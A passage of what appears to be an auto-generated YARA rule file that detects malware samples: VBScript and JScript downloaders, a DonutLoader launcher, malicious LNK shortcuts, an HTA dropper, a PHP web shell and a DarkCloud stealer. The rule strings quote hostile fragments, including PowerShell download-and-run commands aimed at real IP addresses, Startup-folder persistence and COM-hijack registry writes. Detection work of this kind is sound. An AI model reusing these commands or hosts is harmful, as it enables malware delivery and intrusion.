      hash1 = "cddd3f99b7888355e27c3ca20eec65f4f4adc219b84de5ca67cb6e9bc93d19bc"
   strings:
      $x1 = "start_up  = wshShell.ExpandEnvironmentStrings( \"%appdata%\" ) & \"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Host.vbe" ascii /* score: '31.00'*/
      $s2 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/smtpauthenticate\") = 1" fullword ascii /* score: '24.00'*/
      $s3 = "Const host_url = \"http://138.201.207.87/ORDINI/Host.txt\"" fullword ascii /* score: '24.00'*/
      $s4 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/smtpserverport\")   = 25" fullword ascii /* score: '23.00'*/
      $s5 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/sendpassword\")     = password" fullword ascii /* score: '23.00'*/
      $s6 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/smtpusessl\")       = true" fullword ascii /* score: '20.00'*/
      $s7 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/smtpserver\")       = \"smtp-server.com\"" fullword ascii /* score: '20.00'*/
      $s8 = "emailConfig.Fields(\"http://schemas.microsoft.com/cdo/configuration/sendusername\")     = fromEmail" fullword ascii /* score: '18.00'*/
      $s9 = "Set colItems      = objWMIService.ExecQuery( strQuery, \"WQL\", 48 )" fullword ascii /* score: '18.00'*/
      $s10 = "ret_val =  wshShell.run (\"cmd /c \" & str_cmd  , 1 , True   )" fullword ascii /* score: '18.00'*/
      $s11 = "computerName  = wshShell.ExpandEnvironmentStrings( \"%ComputerName%\" )" fullword ascii /* score: '16.00'*/
      $s12 = "'LOG_FILE_2.WriteLine local_path & \"Host.vbe\"" fullword ascii /* score: '16.00'*/
      $s13 = "userName  = wshShell.ExpandEnvironmentStrings( \"%userName%\" )" fullword ascii /* score: '16.00'*/
      $s14 = "Set objWMIService = GetObject( \"winmgmts://./root/CIMV2\" )" fullword ascii /* score: '15.00'*/
      $s15 = "'Set LOG_FILE_2 = fso.CreateTextFile(local_path & \"LOG_FILE_2.txt\",True)" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule d54d51a15e3192ea3a56b7ea7ade5c3a0e248498227f959faf5eaccb079769dd_d54d51a1 {
   meta:
      description = "_subset_batch - file d54d51a15e3192ea3a56b7ea7ade5c3a0e248498227f959faf5eaccb079769dd_d54d51a1.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d54d51a15e3192ea3a56b7ea7ade5c3a0e248498227f959faf5eaccb079769dd"
   strings:
      $s1 = "Const Localfile = \"C:\\Users\\Public\\Libraries\\ORDINE.exe\"" fullword ascii /* score: '30.00'*/
      $s2 = "Oshell.Exec Localfile" fullword ascii /* score: '24.00'*/
      $s3 = "Url_array(1) = \"http://138.201.207.87/ORDINI/\" & Username & Separ & Computername & _" fullword ascii /* score: '20.00'*/
      $s4 = "Url_array(3) = \"http://199.103.56.165/ORDINI/\" & Username & Separ & Computername & _" fullword ascii /* score: '20.00'*/
      $s5 = "Url_array(0) = \"http://138.201.207.87/ORDINI/ORDINE.txt\"" fullword ascii /* score: '19.00'*/
      $s6 = "Url_array(2) = \"http://199.103.56.165/ORDINI/ORDINE.txt\"" fullword ascii /* score: '19.00'*/
      $s7 = "Set Oshellenv = Oshell.Environment(\"Process\")" fullword ascii /* score: '17.00'*/
      $s8 = "Dim Oshell, Separ, Comp, Computername, Username, Oshellenv, A" fullword ascii /* score: '17.00'*/
      $s9 = "Xmlhttp.Open \"GET\", Strurl, False" fullword ascii /* score: '15.00'*/
      $s10 = "Wscript.Sleep 5000" fullword ascii /* score: '13.00'*/
      $s11 = "Wscript.Sleep 120000" fullword ascii /* score: '13.00'*/
      $s12 = "Set Oshell = Createobject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s13 = "Computername = Oshellenv(\"ComputerName\")" fullword ascii /* score: '12.00'*/
      $s14 = "Username = Oshellenv(\"userName\")" fullword ascii /* score: '12.00'*/
      $s15 = "\"/ORDINE.txt\"" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 7KB and
      8 of them
}

rule DonutLoader_signature_ {
   meta:
      description = "_subset_batch - file DonutLoader(signature).vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ef9edac46a8119f9605b2a291b9962686034858acc044d27e4874045efd452c9"
   strings:
      $x1 = "file.Write \"Function JunkFunction1 {\" & vbCrLf & \"    Param($param1)\" & vbCrLf & \"    $x = 0\" & vbCrLf & \"    for ($i = 0" ascii /* score: '57.00'*/
      $x2 = "command = \"powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File \"\"\" & tempFile & \"\"\"\"" fullword ascii /* score: '45.00'*/
      $s3 = "wshShell.Run command, 0, False" fullword ascii /* score: '23.00'*/
      $s4 = "Dim wshShell, fso, tempFolder, tempFile, file, command" fullword ascii /* score: '21.00'*/
      $s5 = "tempFolder = fso.GetSpecialFolder(2)" fullword ascii /* score: '16.00'*/
      $s6 = "tempFile = fso.BuildPath(tempFolder, GenerateRandomName(12) & \".ps1\")" fullword ascii /* score: '15.00'*/
      $s7 = "Set wshShell = CreateObject(\"WScript.Shell\")" fullword ascii /* score: '12.00'*/
      $s8 = "oadData($u + \"\"?action=get_payload&key_id=461710175dafb906\"\")\" & vbCrLf & \"        $a = New-Object Security.Cryptography.A" ascii /* score: '12.00'*/
      $s9 = "    wshShell.Run \"timeout /T \" & seconds & \" /NOBREAK\", 0, True" fullword ascii /* score: '11.00'*/
      $s10 = "Set file = fso.CreateTextFile(tempFile, True)" fullword ascii /* score: '11.00'*/
      $s11 = "If fso.FileExists(tempFile) Then" fullword ascii /* score: '11.00'*/
      $s12 = "Set wshShell = Nothing" fullword ascii /* score: '9.00'*/
      $s13 = "\".com\"\"\" & vbCrLf & \"    $u += \"\"/al\"\"\" & vbCrLf & \"    $u += \"\"luser/\"\"\" & vbCrLf & \"    $u += \"\"big\"\"\" &" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x704f and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule ca0a6b2624e6b67ff4062d6ad2656ff7179df432f6271cb0efbd2128ccc742ac_ca0a6b26 {
   meta:
      description = "_subset_batch - file ca0a6b2624e6b67ff4062d6ad2656ff7179df432f6271cb0efbd2128ccc742ac_ca0a6b26.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ca0a6b2624e6b67ff4062d6ad2656ff7179df432f6271cb0efbd2128ccc742ac"
   strings:
      $s1 = ", -a0_0x510da5._0x33a75b), _0x25b3e5 = GetObject('\\x77\\x69\\x6e\\x6d\\x67\\x6d\\x74\\x73' + _0xe27c81(a0_0x510da5._0xaa435d, 0" ascii /* score: '17.00'*/
      $s2 = "\\x30\\x4d', _0x23be4[_0x40ecec(a0_0x1648d6._0x121ea9, -0x16c) + '\\x6f\\x6e'][_0x40ecec(a0_0x1648d6._0x2ad9cc, 0x20d)] = _0x40e" ascii /* score: '13.00'*/
      $s3 = "e\\x37\\x30\\x32' + _0x640d8e(-a0_0x4b73d9._0x3b4018, -a0_0x4b73d9._0xd4029c) + _0x4eeaa2);" fullword ascii /* score: '12.00'*/
      $s4 = "xda04ae, _0x192af2[_0x42aa0d + 0x6], 0xf, -0x5cfebcec), _0x2383df, _0x349efa, _0x192af2[_0x42aa0d + 0xd], 0x15, 0x4e0811a1), _0x" ascii /* score: '12.00'*/
      $s5 = "' + _0x40ecec(0x32, a0_0x1648d6._0x231097) + _0x40ecec(-0x11, -a0_0x1648d6._0x5e69c0) + '\\x65\\x73'] = ![], _0x8bc70a[_0x40ecec" ascii /* score: '12.00'*/
      $s6 = "ef7b(a0_0x22d0b9._0x43b183, a0_0x22d0b9._0x5ddfb0) + _0x8eef7b(a0_0x22d0b9._0x3bf93c, -0x42)]('\\x41\\x75\\x74\\x68\\x6f\\x72\\x" ascii /* score: '12.00'*/
      $s7 = "e85f, _0xc53f18[_0x2a5201 + 0x1], 0x4, -0x5b4115bc), _0x418221, _0x3c96e8, _0x323c2b[_0x4b817c + 0x4], 0xb, 0x4bdecfa9), _0x7278" ascii /* score: '12.00'*/
      $s8 = " _0xe27c81(-a0_0x510da5._0x73eeeb, a0_0x510da5._0x191faf) : _0xe27c81(-a0_0x510da5._0x5ab12f, -a0_0x510da5._0x529e2a) + '\\x38';" ascii /* score: '12.00'*/
      $s9 = "5' + '\\x6e'] = !![], _0x8bc70a[_0x40ecec(-0xd2, -0x25e) + _0x40ecec(-a0_0x1648d6._0x2f5692, -a0_0x1648d6._0xc50fae) + '\\x69\\x" ascii /* score: '12.00'*/
      $s10 = ") + _0x1ecc71(-a0_0x2e5d71._0x57e577, -a0_0x2e5d71._0x73bb0b) + '\\x63\\x74'), _0x4ec79b = new ActiveXObject('\\x53\\x68\\x65\\x" ascii /* score: '12.00'*/
      $s11 = "48f0._0xddcf52)]), _0x35dcba[_0x290c3e(-0x19b, -0x291) + '\\x6c\\x65'](_0x369eab, 0x2), _0x35dcba['\\x43\\x6c\\x6f\\x73\\x65']()" ascii /* score: '12.00'*/
      $s12 = "68c157) + '\\x79'](_0xe27c81(-a0_0x510da5._0x8392b6, -0x1a6) + _0xe27c81(a0_0x510da5._0x21abfe, 0xbd) + _0xe27c81(-0x82, -0x18a)" ascii /* score: '12.00'*/
      $s13 = ", a0_0x168f75._0x4eb9e5)) / 0x2) + -parseInt(_0x44a5ad(0x701, 0x685)) / 0x3 * (-parseInt(_0x44a5ad(a0_0x168f75._0x10a316, 0x50d)" ascii /* score: '12.00'*/
      $s14 = "0x147e21, _0x51f34c[_0x1c09af + 0x8], 0x6, 0x6fa87e4f), _0x4dedc2, _0x37cd0e, _0x3cbc8e[_0x17cd68 + 0xf], 0xa, -0x1d31920), _0x1" ascii /* score: '12.00'*/
      $s15 = "9df, _0x29e9cc[_0x16368f + 0x8], 0x7, 0x698098d8), _0x516917, _0x4d58d1, _0xfdd4dd[_0x3eb16c + 0x9], 0xc, -0x74bb0851), _0x45519" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 900KB and
      8 of them
}

rule dbc34aab5ab5aafc9e3886d8eacd637229c7524141c4914337d304ea295f7804_dbc34aab {
   meta:
      description = "_subset_batch - file dbc34aab5ab5aafc9e3886d8eacd637229c7524141c4914337d304ea295f7804_dbc34aab.php"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dbc34aab5ab5aafc9e3886d8eacd637229c7524141c4914337d304ea295f7804"
   strings:
      $s1 = "    @import url(https://fonts.googleapis.com/css?family=Dosis);@import url(https://fonts.googleapis.com/css?family=Bungee);@impo" ascii /* score: '22.00'*/
      $s2 = "rt url(https://fonts.googleapis.com/css?family=Russo+One);body{font-family:Consolas,cursive;text-shadow:0 0 1px #757575}body::-w" ascii /* score: '17.00'*/
      $s3 = "  <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #ff" ascii /* score: '17.00'*/
      $s4 = "<link href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css\"rel=\"stylesheet\">" fullword ascii /* score: '17.00'*/
      $s5 = "<br><a href='https://youtu.be/kmvHFzIF1y8?si=cVH00ZnsGA4szU_2' target='_blank'>You Tube Gratis</a></center>\";" fullword ascii /* score: '17.00'*/
      $s6 = "        header(\"Content-Description: File Transfer\");" fullword ascii /* score: '15.00'*/
      $s7 = "    @import url(https://fonts.googleapis.com/css?family=Dosis);@import url(https://fonts.googleapis.com/css?family=Bungee);@impo" ascii /* score: '15.00'*/
      $s8 = "$_COOKIE[md5($_SERVER['HTTP_HOST'])] = $auth_pass;" fullword ascii /* score: '15.00'*/
      $s9 = "$m_821bfdba = (isset($_SERVER[\"HTTPS\"]) && $_SERVER[\"HTTPS\"] === \"on\" ? \"https\" : \"http\") . \"://\" . $_SERVER[\"HTTP_" ascii /* score: '15.00'*/
      $s10 = "function Login() {" fullword ascii /* score: '15.00'*/
      $s11 = "if (@file_exists(\"/usr/bin/pkexec\")) {" fullword ascii /* score: '15.00'*/
      $s12 = "r(sprintf(\"%o\", fileperms($_POST[\"loknya\"])), -4) . '\" /><input type=\"hidden\" name=\"loknya\" value=\"' . $_POST[\"loknya" ascii /* score: '13.00'*/
      $s13 = "ubstr(sprintf(\"%o\", fileperms($_POST[\"loknya\"])), -4) . '\" /><input type=\"hidden\" name=\"loknya\" value=\"' . $_POST[\"lo" ascii /* score: '13.00'*/
      $s14 = "        header(\"Content-Control: public\");" fullword ascii /* score: '12.00'*/
      $s15 = "        header(\"Content-Transfer-Encoding: binary\");" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      8 of them
}

rule c0e2d6d8e4e27d2a8ce39077fc053d1e1e2a1b3f00d864e7bd326e40f80f878e_c0e2d6d8 {
   meta:
      description = "_subset_batch - file c0e2d6d8e4e27d2a8ce39077fc053d1e1e2a1b3f00d864e7bd326e40f80f878e_c0e2d6d8.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c0e2d6d8e4e27d2a8ce39077fc053d1e1e2a1b3f00d864e7bd326e40f80f878e"
   strings:
      $s1 = "var struggled = pistillaria.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s2 = "var cardamons = pistillaria.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '22.00'*/
      $s3 = "var Albigenses = skiascopic.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var nigella = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var pistillaria = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var skiascopic = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + ladylove + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "villakin = villakin + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule c83f645369bd6c84db6f1750f895037077647323d811b61b15f34f2ab4f18292_c83f6453 {
   meta:
      description = "_subset_batch - file c83f645369bd6c84db6f1750f895037077647323d811b61b15f34f2ab4f18292_c83f6453.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c83f645369bd6c84db6f1750f895037077647323d811b61b15f34f2ab4f18292"
   strings:
      $s1 = "var subscripts = carburation.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '25.00'*/
      $s2 = "var oxazolidine = Sarpedon.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s3 = "var crayonist = carburation.Get(\"Win32_Process\");" fullword ascii /* score: '19.00'*/
      $s4 = "subscripts.ShowWindow = 0; " fullword ascii /* score: '13.00'*/
      $s5 = "var nonoxidising = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var Sarpedon = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "var guizard = crayonist.Create(subirrigation, oxazolidine, subscripts, nonoxidising);" fullword ascii /* score: '10.00'*/
      $s8 = "var carburation = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + truthier + '\\'" fullword ascii /* score: '8.00'*/
      $s10 = "subirrigation = subirrigation + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule e0f82869ae1a99dabc3dfd3ec1f198b79791a0f6ef9733fd83fd9885afa068bf_e0f82869 {
   meta:
      description = "_subset_batch - file e0f82869ae1a99dabc3dfd3ec1f198b79791a0f6ef9733fd83fd9885afa068bf_e0f82869.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e0f82869ae1a99dabc3dfd3ec1f198b79791a0f6ef9733fd83fd9885afa068bf"
   strings:
      $s1 = "var cleansing = fuego.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var jackshit = fuego.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var nodulose = sidetrack.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var unwilled = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var fuego = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var sidetrack = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "reticulosa = reticulosa + '" fullword ascii /* score: '8.00'*/
      $s8 = "g(\\'' + eighteenths + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule e9a84cbed4e8a0db986cf1f3dcce95509e4774599173866c51f595b4cd7a5283_e9a84cbe {
   meta:
      description = "_subset_batch - file e9a84cbed4e8a0db986cf1f3dcce95509e4774599173866c51f595b4cd7a5283_e9a84cbe.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e9a84cbed4e8a0db986cf1f3dcce95509e4774599173866c51f595b4cd7a5283"
   strings:
      $s1 = "var madrina = nectaries.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var dachshunds = nectaries.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var fiftysomethings = prescience.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "narratology = narratology + 'M" fullword ascii /* score: '13.00'*/
      $s5 = "var toxodont = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "var nectaries = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s7 = "var prescience = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s8 = "var newsbot = dachshunds.Create(narratology, fiftysomethings, madrina, toxodont);" fullword ascii /* score: '9.00'*/
      $s9 = "var narratology = 'M" fullword ascii /* score: '9.00'*/
      $s10 = "narratology = narratology .replace(/M" fullword ascii /* score: '9.00'*/
      $s11 = "g(\\'' + nonassessable + '\\'M" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      8 of them
}

rule b933b86aa7cd2e2a2debbbfb7ee0d0e70d078030d334ba49cd254bf7cb1ff38c_b933b86a {
   meta:
      description = "_subset_batch - file b933b86aa7cd2e2a2debbbfb7ee0d0e70d078030d334ba49cd254bf7cb1ff38c_b933b86a.vba"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b933b86aa7cd2e2a2debbbfb7ee0d0e70d078030d334ba49cd254bf7cb1ff38c"
   strings:
      $s1 = " <script language ='&#x76;&#x62;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;' src='https://cokektedeasa2323.icu/ARCHIVOS/4Has_F64.txt'/>" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x5927 and filesize < 1000KB and
      all of them
}

rule b9579e65e5499be393cf182496103941a006479ff8b41c0ad3b57b1d678d9794_b9579e65 {
   meta:
      description = "_subset_batch - file b9579e65e5499be393cf182496103941a006479ff8b41c0ad3b57b1d678d9794_b9579e65.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9579e65e5499be393cf182496103941a006479ff8b41c0ad3b57b1d678d9794"
   strings:
      $x1 = "-WindowStyle hidden -c \"New-Item -Path 'HKCU:\\Software\\Classes\\CLSID\\{c53e07ec-25f3-4093-aa39-fc67ea22e99d}\\InprocServer32" wide /* score: '40.00'*/
      $x2 = ".zip'}|select -First 1).FullName};[System.IO.File]::WriteAllBytes([System.IO.Path]::Combine($env:TEMP,'C:\\sponge-bob\\exe-zip-i" wide /* score: '37.00'*/
      $x3 = ".pdf'),([System.IO.File]::ReadAllBytes($r)|select -Skip 642064 -First 225723));start $([System.IO.Path]::Combine($env:TEMP, 'C:" wide /* score: '37.00'*/
      $x4 = ".zip'}|select -First 1); if($f){$r=$f.FullName;[System.IO.File]::WriteAllBytes('%ProgramData%\\winnt64_.dll',([System.IO.File]::" wide /* score: '34.00'*/
      $s5 = ".zip');if(Test-Path $r){[System.IO.File]::WriteAllBytes([System.IO.Path]::Combine($env:ProgramData,'winnt64_.dll'),([System.IO.F" wide /* score: '29.00'*/
      $s6 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s7 = ".pdf'));9%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide /* score: '11.00'*/
      $s8 = "WindowsPowerShell" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 8KB and
      1 of ($x*) and all of them
}

rule c543a9c2ab6349444795f2493ce6b7027a3bf0b3e3d0bfdd078a291de7a7e7bd_c543a9c2 {
   meta:
      description = "_subset_batch - file c543a9c2ab6349444795f2493ce6b7027a3bf0b3e3d0bfdd078a291de7a7e7bd_c543a9c2.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c543a9c2ab6349444795f2493ce6b7027a3bf0b3e3d0bfdd078a291de7a7e7bd"
   strings:
      $x1 = "-win 1 iwr -uri htt''p://14''6''.''185.23''9''.8/so4nik/capacity.ps1 -OutFile capacity.ps1; powershell.exe -noprofile -execution" wide /* score: '42.00'*/
      $s2 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s3 = "WindowsPowerShell" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule c746152c4e23fb14b4437b4777b2c850539795ff7e1ae9d6f80ab26ec94dbec5_c746152c {
   meta:
      description = "_subset_batch - file c746152c4e23fb14b4437b4777b2c850539795ff7e1ae9d6f80ab26ec94dbec5_c746152c.lnk"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c746152c4e23fb14b4437b4777b2c850539795ff7e1ae9d6f80ab26ec94dbec5"
   strings:
      $x1 = "/WLENA:KQQ6G /WHUT:O2TFC /D/C \"for %E in (atch) do for %M in (c) do  for %I in (tr) do for %R in (y) do  for %X in (ndow) do fo" wide /* score: '45.00'*/
      $x2 = "C:\\Windows\\System32\\cmd.exe" fullword ascii /* score: '38.00'*/
      $s3 = "Gabriela Cunha$..\\..\\..\\..\\Windows\\System32\\cmd.exe" fullword wide /* score: '27.00'*/
      $s4 = "C:\\Windows\\System32" fullword wide /* score: '18.00'*/
   condition:
      uint16(0) == 0x004c and filesize < 9KB and
      1 of ($x*) and all of them
}

rule b9c8e36504a6c1e6ecb3c1dbc008c60d1793735e9c6bb092aba8e491103c1764_b9c8e365 {
   meta:
      description = "_subset_batch - file b9c8e36504a6c1e6ecb3c1dbc008c60d1793735e9c6bb092aba8e491103c1764_b9c8e365.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b9c8e36504a6c1e6ecb3c1dbc008c60d1793735e9c6bb092aba8e491103c1764"
   strings:
      $s1 = "{Deadtoast (c) Drizy Studio 2022Deadtoast DemoRegularVersion 1.000;PYRS;Deadtoast-Demo;2022;FL720Deadtoast DemoVersion 1.000Dead" ascii /* score: '22.00'*/
      $s2 = "yDeadtoast (c) Drizy Studio 2022Deadtoast DemoRegularVersion 1.000;PYRS;Deadtoast-Demo;2022;FL720Deadtoast DemoVersion 1.000Dead" wide /* score: '22.00'*/
      $s3 = "rizystudio.com/fontPersonal Use Only" fullword ascii /* score: '17.00'*/
      $s4 = "toast-DemoDeadtoast Trademark of Drizy StudioDrizy StudioDrizy StudioThis is demo version get full licensed on our websiteswww.d" ascii /* score: '12.00'*/
      $s5 = "wlhead!" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0100 and filesize < 100KB and
      all of them
}

rule DarkCloud_signature__83f7b78217399a53bfe6705fb71ec96a_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_83f7b78217399a53bfe6705fb71ec96a(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cfb9be6b39322248c44231248d2823b4243ba763f39c0056f33d5b379ca0a8b9"
   strings:
      $s1 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s2 = "Available logic disk: " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      all of them
}

rule bc5dba6229be156febd7ec4c8660010b6040bda77f38124ce54eedc78defd020_bc5dba62 {
   meta:
      description = "_subset_batch - file bc5dba6229be156febd7ec4c8660010b6040bda77f38124ce54eedc78defd020_bc5dba62.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bc5dba6229be156febd7ec4c8660010b6040bda77f38124ce54eedc78defd020"
   strings:
      $s1 = "zNpr('B_170') = 'MAPWF9 gZzgI RjAJd YVFOMI pH0ZiYJ Yy8 nE8O /0A 0sRH3I3X OxV3DyMB8K MBUNMCoZX x/OI NBwBgBg0Iu BFDD6AbFg6 QoJU4DA" ascii /* score: '20.00'*/
      $s2 = "zNpr('B_162') = 'JrgD1Awy JAACAPahWwx BBASAMA gTKRJDyBgh9 N6LvIIYEwoV Awt1JBA dAgxmOGSPCESk VHgBJiIJhOyLiU 1LiEADvI TdxQwHkoDBmw" ascii /* score: '20.00'*/
      $s3 = "Amea HQ0IS5L B84cJogUQMV0h8 HEEQE7AcBwX iIvkwLMW ABi N6TkIkQf7DAQZ ELhe AkEBE RMLkaJB uBtMINKzCQHF+ or/ie AtTSPYbxNQ8s lOGSi8iyC" ascii /* score: '18.00'*/
      $s4 = "zNpr('B_241') = ' Sgw+gIdFCAQCX JiEzD 3lXAE0XBN +iJB zeAsYSoM3i JByWAsY SAAQCgSCn A0IT///H+ iOQAQCTNi01 /HE AAwb3A AgF4GkB0 Bg9F" ascii /* score: '18.00'*/
      $s5 = "zNpr('B_370') = 'gE JEdsZ IRCRNyUG 0BchI 9//5TJ6SYwAI mb0 LiD7DiE zMz8woQ8gIF8iB T5DA XISJPz//fvpo rBwE4Vuo w+gIx MzMD/6DvYSD/ F" ascii /* score: '18.00'*/
      $s6 = "zNpr('B_259') = 'AEMSI8U jIBE HAAMADMK890I SDD4YId 9/wQCRJCwB C1IRwQCT NCA SAAAAEoLABAA vIptLV8v4rf EA9RB wDTBwDiE9Ql mUUAcRAhTn" ascii /* score: '18.00'*/
      $s7 = "zNpr('B_34') = 'RLmkA Btz6 nOMo4OS8ILfqf GT/gWsZKbX uwP7FTPsG2hi snwkN2 PwrQ P0r6WfdpDDCyHB +kq mI7A wYn9b Qnekf+ No4 Xp9S qcRt3" ascii /* score: '17.00'*/
      $s8 = "zNpr('B_64') = 'QWHFcG 4FcmCqUwZBUw Z9VwZAWw ZqpaBn FWE70QQ SBLgOFHA31lEJj PAFFlQ7W3 AFCKAWo sCwWVQJBIAHY oSj7 8vgXkS EIn8CKV y4" ascii /* score: '16.00'*/
      $s9 = "zNpr('B_50') = 'iPfTXKo+RtR 9c4yRgG3oqK hKzk4dB6QU Ix+sqbGkriG X9n /YNpgE37 bNB5nffJSB rMJhtt1y gFh2QN6MaddCEH LDfy7ui 7B/R1 R9B" ascii /* score: '15.00'*/
      $s10 = "zNpr('B_199') = '0rsBwR0BI E+xDmZGAIN KQDKa4fxV QdFkXBB4XBN+ iJh0cLCQSAt 2iJhzWLCQSX FEJc2IT AAAQ/wF6MPDSS JAjCsIS3QQjI9 eAlFw8r" ascii /* score: '15.00'*/
      $s11 = "zNpr('B_38') = 'n T4tuccuD3mFI Jwmxq7 IJmnuvK74T/HN aiHihJVKm0J+J JFT0WfO TVABN1P2 lA3r6oN0oBGO 11r bguLV iRHgQ KtR7FHSp lzwk7PF" ascii /* score: '15.00'*/
      $s12 = "zNpr('B_274') = '8Ao Chy DQCQSAMdiN iEkKhCQPEQKP ESQS2ISII AKPAwnggL W1hwDgPYw LgkwCAQAD CLBAYBQAguShq bWwXuwF0ITgQ CVJCASGEwDN " ascii /* score: '15.00'*/
      $s13 = "zNpr('B_251') = 'AHJM lBAItISr CaEFCHSwBHJ MdHIIlS8ly0Z QjUKwaEIIBA0 Io1TRdH oqHO6 QvISADZT8 BVA+2cF /DSD 2FAo U1AdkgO0VB9 izW4D" ascii /* score: '15.00'*/
      $s14 = "zNpr('B_360') = 'CCkGABuYQ Wv4tBsAA 4PDDRP QDaCwMDvYQ QYxzBf9IBt /iA8IABRbTDU 9pRC4RH2IR WX0AHnEBFgteA sYQGBQ2DQES HLVADPiwL2QAU" ascii /* score: '14.00'*/
      $s15 = "cDjWh += \"2MalDUMp2 SB9UawF GOwVnYN1 ERlZW QtxWQCFTO vBDZF12QBBV YEtkTxsm RtN3LkZVYHd3 S5pURzE\";" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 1000KB and
      8 of them
}

rule bd01711c037000f01d2ae4592e4a870eb8ff9013f805adae835911556200bd05_bd01711c {
   meta:
      description = "_subset_batch - file bd01711c037000f01d2ae4592e4a870eb8ff9013f805adae835911556200bd05_bd01711c.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
